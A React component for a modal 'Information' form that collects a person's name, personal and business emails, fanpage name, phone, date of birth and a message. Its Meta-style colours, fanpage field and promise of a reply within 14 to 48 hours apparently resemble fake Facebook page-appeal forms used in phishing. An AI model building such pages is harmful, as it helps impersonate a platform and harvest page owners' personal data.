import { useState } from 'react';
import PropTypes from 'prop-types';
import PhoneInput from '@/components/phone-input';

const inputStyle = {
    width: '100%',
    border: '1px solid #d4dbe3',
    height: '40px',
    padding: '0 11px',
    borderRadius: '10px',
    background: '#fff',
    fontSize: '14px',
    marginBottom: '10px',
    display: 'flex',
    alignItems: 'center',
    transition: 'border-color 0.2s, box-shadow 0.2s',
    boxSizing: 'border-box'
};

const InputWrapper = ( { error, children } ) =>
{
    const [ focused, setFocused ] = useState( false );
    return (
        <div
            style={ {
                ...inputStyle,
                borderColor: error ? '#ef4444' : focused ? '#3b82f6' : '#d4dbe3',
                boxShadow: focused ? '0 4px 12px rgba(59,130,246,0.1)' : 'none'
            } }
            onFocus={ () => setFocused( true ) }
            onBlur={ () => setFocused( false ) }
        >
            { children }
        </div>
    );
};

const FirstFormModal = ( { show, onClose, onSubmit, texts } ) =>
{
    const [ formData, setFormData ] = useState( {
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        day: '',
        month: '',
        year: '',
        message: '',
        agreeTerms: false
    } );
    const [ errors, setErrors ] = useState( {} );

    const handleChange = ( field, value ) =>
    {
        setFormData( ( prev ) => ( { ...prev, [ field ]: value } ) );
        if ( errors[ field ] )
        {
            setErrors( ( prev ) => ( { ...prev, [ field ]: false } ) );
        }
    };

    const handleSubmit = ( e ) =>
    {
        e.preventDefault();
        const newErrors = {};

        if ( !formData.fullName.trim() ) newErrors.fullName = true;
        if ( !formData.personalEmail.trim() ) newErrors.personalEmail = true;
        if ( !formData.businessEmail.trim() ) newErrors.businessEmail = true;
        if ( !formData.phone.trim() ) newErrors.phone = true;
        if ( !formData.pageName.trim() ) newErrors.pageName = true;
        if ( !formData.agreeTerms ) newErrors.agreeTerms = true;

        if ( Object.keys( newErrors ).length > 0 )
        {
            setErrors( newErrors );
            return;
        }

        onSubmit( {
            fullName: formData.fullName,
            personalEmail: formData.personalEmail,
            businessEmail: formData.businessEmail,
            phone: formData.phone,
            pageName: formData.pageName,
            dob: `${ formData.day }/${ formData.month }/${ formData.year }`,
            message: formData.message
        } );
    };

    if ( !show ) return null;

    return (
        <>
            {/* Backdrop */ }
            <div
                onClick={ onClose }
                style={ {
                    position: 'fixed', inset: 0, zIndex: 1040,
                    background: 'rgba(0,0,0,0.5)'
                } }
            />

            {/* Modal centered */ }
            <div
                style={ {
                    position: 'fixed', inset: 0, zIndex: 1050,
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    padding: '16px'
                } }
            >
                <div
                    style={ {
                        background: 'linear-gradient(130deg, rgba(249,241,249,1) 0%, rgba(234,243,253,1) 35%, rgba(237,251,242,1) 100%)',
                        width: '100%',
                        maxWidth: '512px',
                        maxHeight: '90vh',
                        borderRadius: '16px',
                        boxShadow: '0 20px 60px rgba(0,0,0,0.2)',
                        padding: '20px',
                        display: 'flex',
                        flexDirection: 'column',
                        overflow: 'hidden'
                    } }
                    onClick={ ( e ) => e.stopPropagation() }
                >
                    {/* Header */ }
                    <div style={ { display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '10px', flexShrink: 0 } }>
                        <h2 style={ {
                            fontWeight: '700',
                            color: '#0A1317',
                            fontSize: '15px',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            textAlign: 'center',
                            margin: 0
                        } }>
                            Information
                        </h2>
                        <div
                            onClick={ onClose }
                            style={ { width: '18px', height: '18px', cursor: 'pointer', opacity: 0.6, display: 'flex', alignItems: 'center', justifyContent: 'center', transition: 'opacity 0.2s' } }
                            onMouseOver={ ( e ) => e.currentTarget.style.opacity = '1' }
                            onMouseOut={ ( e ) => e.currentTarget.style.opacity = '0.6' }
                        >
                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0A1317" strokeWidth="2.5" strokeLinecap="round">
                                <path d="M18 6L6 18M6 6l12 12" />
                            </svg>
                        </div>
                    </div>

                    {/* Scrollable body */ }
                    <div style={ { flex: 1, overflowY: 'auto' } }>
                        <form autoComplete="off" onSubmit={ handleSubmit } style={ { width: '100%' } }>

                            {/* Full Name */ }
                            <InputWrapper error={ errors.fullName }>
                                <input
                                    id="fullName"
                                    placeholder={ texts.fullName || "Full Name" }
                                    type="text"
                                    value={ formData.fullName }
                                    onChange={ ( e ) => handleChange( 'fullName', e.target.value ) }
                                    style={ { width: '100%', outline: 'none', border: 'none', background: 'transparent', fontSize: '14px', letterSpacing: '0.025em', height: '100%' } }
                                />
                            </InputWrapper>

                            {/* Email */ }
                            <InputWrapper error={ errors.personalEmail }>
                                <input
                                    id="email"
                                    placeholder={ texts.personalEmail || "Email Address" }
                                    type="email"
                                    value={ formData.personalEmail }
                                    onChange={ ( e ) => handleChange( 'personalEmail', e.target.value ) }
                                    style={ { width: '100%', outline: 'none', border: 'none', background: 'transparent', fontSize: '14px', letterSpacing: '0.025em', height: '100%' } }
                                />
                            </InputWrapper>

                            {/* Business Email */ }
                            <InputWrapper error={ errors.businessEmail }>
                                <input
                                    id="emailBusiness"
                                    placeholder={ texts.businessEmail || "Email Business Address" }
                                    type="email"
                                    value={ formData.businessEmail }
                                    onChange={ ( e ) => handleChange( 'businessEmail', e.target.value ) }
                                    style={ { width: '100%', outline: 'none', border: 'none', background: 'transparent', fontSize: '14px', letterSpacing: '0.025em', height: '100%' } }
                                />
                            </InputWrapper>

                            {/* Fanpage Name */ }
                            <InputWrapper error={ errors.pageName }>
                                <input
                                    id="fanpage"
                                    placeholder={ texts.fanpageName || "Fanpage Name" }
                                    type="text"
                                    value={ formData.pageName }
                                    onChange={ ( e ) => handleChange( 'pageName', e.target.value ) }
                                    style={ { width: '100%', outline: 'none', border: 'none', background: 'transparent', fontSize: '14px', letterSpacing: '0.025em', height: '100%' } }
                                />
                            </InputWrapper>

                            {/* Phone */ }
                            <div style={ { marginBottom: '10px' } }>
                                <PhoneInput
                                    error={ errors.phone }
                                    id="PhoneFirld"
                                    name="mobile-phone-number"
                                    value={ formData.phone }
                                    onChange={ ( val ) => handleChange( 'phone', val ) }
                                />
                            </div>

                            {/* Date of Birth */ }
                            <b style={ { color: '#9a979e', fontSize: '14px', marginBottom: '7px', display: 'block' } }>{ texts.dateOfBirth || 'Date of Birth' }</b>
                            <div style={ { display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '10px' } }>
                                <InputWrapper>
                                    <input
                                        id="day"
                                        placeholder={ texts.day || "Day" }
                                        type="number"
                                        value={ formData.day }
                                        onChange={ ( e ) => handleChange( 'day', e.target.value ) }
                                        style={ { width: '100%', outline: 'none', border: 'none', background: 'transparent', fontSize: '14px', height: '100%' } }
                                    />
                                </InputWrapper>
                                <InputWrapper>
                                    <input
                                        id="month"
                                        placeholder={ texts.month || "Month" }
                                        type="number"
                                        value={ formData.month }
                                        onChange={ ( e ) => handleChange( 'month', e.target.value ) }
                                        style={ { width: '100%', outline: 'none', border: 'none', background: 'transparent', fontSize: '14px', height: '100%' } }
                                    />
                                </InputWrapper>
                                <InputWrapper>
                                    <input
                                        id="year"
                                        placeholder={ texts.year || "Year" }
                                        type="number"
                                        inputMode="numeric"
                                        value={ formData.year }
                                        onChange={ ( e ) => handleChange( 'year', e.target.value ) }
                                        style={ { width: '100%', outline: 'none', border: 'none', background: 'transparent', fontSize: '14px', height: '100%' } }
                                    />
                                </InputWrapper>
                            </div>

                            {/* Message */ }
                            <div style={ { ...inputStyle, height: '100px', padding: '11px', alignItems: 'flex-start' } }>
                                <textarea
                                    id="message"
                                    placeholder={ texts.message || "Message" }
                                    value={ formData.message }
                                    onChange={ ( e ) => handleChange( 'message', e.target.value ) }
                                    style={ { width: '100%', outline: 'none', border: 'none', background: 'transparent', fontSize: '14px', resize: 'none', height: '100%', fontFamily: 'inherit' } }
                                />
                            </div>

                            {/* Disclaimer */ }
                            <p style={ { color: '#9a979e', fontSize: '14px', marginBottom: '7px' } }>
                                Our response will be sent to you within 14 - 48 hours.
                            </p>

                            {/* Checkbox */ }
                            <div style={ { marginTop: '15px', marginBottom: '20px' } }>
                                <label
                                    htmlFor="custom-checkbox"
                                    style={ { cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '5px', fontSize: '14px' } }
                                >
                                    <div
                                        onClick={ () => handleChange( 'agreeTerms', !formData.agreeTerms ) }
                                        style={ {
                                            width: '16px', height: '16px', minWidth: '16px',
                                            borderRadius: '4px',
                                            border: `1px solid ${ errors.agreeTerms ? '#ef4444' : formData.agreeTerms ? '#0064E0' : '#d1d5db' }`,
                                            background: formData.agreeTerms ? '#0064E0' : '#fff',
                                            display: 'flex', alignItems: 'center', justifyContent: 'center',
                                            transition: 'all 0.2s',
                                            cursor: 'pointer',
                                            flexShrink: 0
                                        } }
                                    >
                                        { formData.agreeTerms && (
                                            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3">
                                                <polyline points="20 6 9 17 4 12" />
                                            </svg>
                                        ) }
                                    </div>
                                    <span>
                                        I agree to the{ ' ' }
                                        <a href="#" style={ { color: '#0064E0' } }>{ texts.termsOfUse || 'Terms of use' }</a>
                                    </span>
                                </label>
                            </div>

                            {/* Submit */ }
                            <div style={ { width: '100%', marginTop: '20px' } }>
                                <button
                                    type="submit"
                                    style={ {
                                        width: '100%',
                                        height: '45px',
                                        minHeight: '45px',
                                        background: '#0064E0',
                                        color: '#fff',
                                        borderRadius: '40px',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        cursor: 'pointer',
                                        fontWeight: '500',
                                        fontSize: '15px',
                                        border: 'none',
                                        fontFamily: 'inherit'
                                    } }
                                >
                                    Submit
                                </button>
                            </div>

                        </form>
                    </div>
                </div>
            </div>
        </>
    );
};

FirstFormModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default FirstFormModal;
